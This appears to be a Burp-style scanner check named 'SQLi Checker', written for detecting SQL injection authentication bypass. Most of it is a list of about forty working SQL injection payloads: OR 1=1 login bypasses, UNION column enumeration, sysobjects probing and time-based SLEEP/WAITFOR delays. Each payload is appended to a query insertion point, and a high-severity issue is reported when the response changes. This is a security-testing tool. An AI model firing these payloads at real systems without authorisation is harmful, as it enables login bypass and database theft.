metadata:
    language: v2-beta
    name: "SQLi Checker"
    description: "Bypass authentication SQLi"
    author: "nu11secur1ty"

run for each:
    payloadSet =
        "'='",
        "'LIKE'",
        "'=0--+",
        "OR 1=1",
        "' OR 'x'='x",
        "' AND id IS NULL; --",
        "'''''''''''''UNION SELECT '2",
        "%00",
        "/*â€¦*/",
        "+ addition, concatenate (or space in url)",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' ORDER BY 1,2--+",
        "1' ORDER BY 1,2,3--+",
        "1' GROUP BY 1,2,--+",
        "1' GROUP BY 1,2,3--+",
        "' GROUP BY columnnames having 1=1 --",
        "-1' UNION SELECT 1,2,3--+",
        "' UNION SELECT sum(columnname ) from tablename --",
        "-1 UNION SELECT 1 INTO @,@:",
        "-1 UNION SELECT 1 INTO @,@,@",
        "1 AND (SELECT * FROM Users) = 1", 
        "' AND MID(VERSION(),1,1) = '5';",
        "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
        ",(select * from (select(sleep(10)))a)",
        "%2c(select%20*%20from%20(select(sleep(10)))a)",
        "';WAITFOR DELAY '0:0:30'--",
        "#       Hash comment",
        "/*      C-style comment",
        "-- -    SQL comment",
        ";%00_Nullbyte",
        "`Backtick",
        "'",
        "' or 1=1 --",
        "' or 1=1 --+",
        "SELECT * FROM users WHERE username = '' OR 1=1--",
        "foo'",
        "SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')",
        "nu11secur1ty' or 1=1#"
        

given query insertion point then
    send payload called check:
        appending: {payloadSet}

    if {check} differs from {base} then
        report issue:
            severity: high
            confidence: certain
            detail: "Found a vulnerable post parameter that got SQLi bypass authentication vulnerability.
                     The payload (') was submitted in a POST + GET request. You must test manually to confirm this vulnerability!"
    end if
